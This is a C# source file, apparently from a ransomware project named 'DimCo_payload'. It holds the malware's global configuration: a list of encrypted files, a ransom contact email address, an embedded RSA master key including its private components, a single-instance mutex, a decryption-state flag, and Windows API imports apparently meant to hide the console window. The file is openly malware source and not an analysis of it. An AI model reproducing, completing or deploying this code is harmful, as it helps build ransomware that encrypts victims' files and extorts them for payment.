using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using DimCo_payload.Encryption;

namespace DimCo_payload;

internal class global
{
	public static List<string> encrypted = new List<string>();

	public static string contact = "jhgf4595f6f5tcg5106354@proton.me";

	public static string masterkey = "<RSAKeyValue><Modulus>0l1gF7BimKWshMlmD3qVeRbhpFTswOwzOThjWTYzewOnOvatntiuCr71rAiOlpn8r8IQQ5OWWEOlIoURMkrVkGMEw93ZTothhZbpBbSx4ykblHGbk8CXUyv6PLHJCcHp6mYCCmBtSJsNR5pe0nhyu+vEPItt6HYAfnR5DOxQIqHlZxWWJ6tHGFEZHAw20LFOqRbQ0VxaTBQfxaMNsCBRTOeMGe/F2ailrKCCvGhCPcCML8PKwS8he2BmWDMRJQ6GAQikQNEwNBELmWz3SerJmQNH6k5S/T6DR2jxeo4Pi4K57EUzpXIwRh9W82i5aIjGppJSxn5P8Mw8AcqIITMcmQ==</Modulus><Exponent>AQAB</Exponent><P>3arzltIg7JGUTYzxeYTWcMikqPEQ/+5m3TviQ0s12aECteAjzPvI8dWQM/oSRQskVUO65R8jlF+dVS7lFUQXQeZSpLyU1uRjRW2PZ5R/pQi/Dh6+Q2CxkmdP8VG+wZAat9qNxBBtO0x7YOqq+d4rZ+QJ274zKH1oazfTU7J+NC8=</P><Q>8vJDPVUaDYiNrHHrq/ys3+p/3erEHUPkqNsd7k+tZm7P7Ysgd0VOb+zlhSoMRxdLUA+p7L0qYjP7jNMwByXvm6/CgXQ+mxmDmgur+fkspn4jn1yJepG4Bb3hd8gyeQ4PsTHInmXEc11DZhtHhcJeUfjPOuBcQBJZoPTaWfCqYbc=</Q><DP>BmELDYYSiHxQBkNOF68o9KnxgyMc2CCmOSumAUXC0PZ/O3itzxJX4A3DTpudtvrxGrsOP9W7kmOGBZOJ6CjDepQEQNVkeyKrcK4MeHCfk8JCrUdZNlssAQiUFl/B25QoEK5rcf7/BbvXuRxHu1UXbq/zUK2Sj1G8lYlPvZLfauU=</DP><DQ>P2eaxNcBBact0mOo7inztDyvQmuS41BkzOzi0t9YkfM5sPUuc/JSlkNtY2Ol8KfTsAFmh7KW7SpD7Gzxi+wKrMciLEb6T+BIyFtjdsnhLVKeWWj9OE/vhxAXV/uXsKBK2CP2B+DndHRSssNL10zy8NHOw77qVI51ddxxYCe/T+E=</DQ><InverseQ>uoiV5IXs/hbfE6Os0m8wW/ZHO/jBMNwHw8gXLNaGjjHQSrc1h0MCG6H8jGTsmgbfowmJhxQokqxn5x/UH/FUGdOr1MMCAOvJ0D7GO3IqXQtACxdzkgZ+UXJgQoIQwCeyBO3uqB5PPmmmpKJ2UduTEf2n9ogbd9sRRWjGumuVpmY=</InverseQ><D>pZ6IQf5HkeCV07FwXe1n8v61xZhrEXSk237ukNUgcNAugDin9rCnTaSMbNYL1LwFeiaygVGYA4O2ZlgXct4CB/w9SyvFo5YOwItQiIJ7rtm1cgiDsS7mtL+h8tkR61G1JSsMnjjOsWQJb380+kWEJzl2tSgc7vDAcM6oYylF6gzYcRqk6I2BwHk+6M4etZUDJfiMi/befwc1H43u8fWzNcDZdHNow8JSkvD+6JvX+OeX6pYHJMO18Ode5CIPhJSB3zo23MYsVB6dwPbo6VzWCtWKYLDw9KcvPDA2ecHfzcFDYxp1rNr/cCuCBTWYRkIiQktI9jOcDQVlJUbjKmqFJQ==</D></RSAKeyValue>";

	public static string mutex = "{BNEVB8C9ZK-IRNJU387-OD8DNQJ3XPG}";

	public static bool isDencrypted = false;

	public static DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys Keys = new DimCo_payload.Encryption.Encryption.RSA.EncryptorRSAKeys();

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
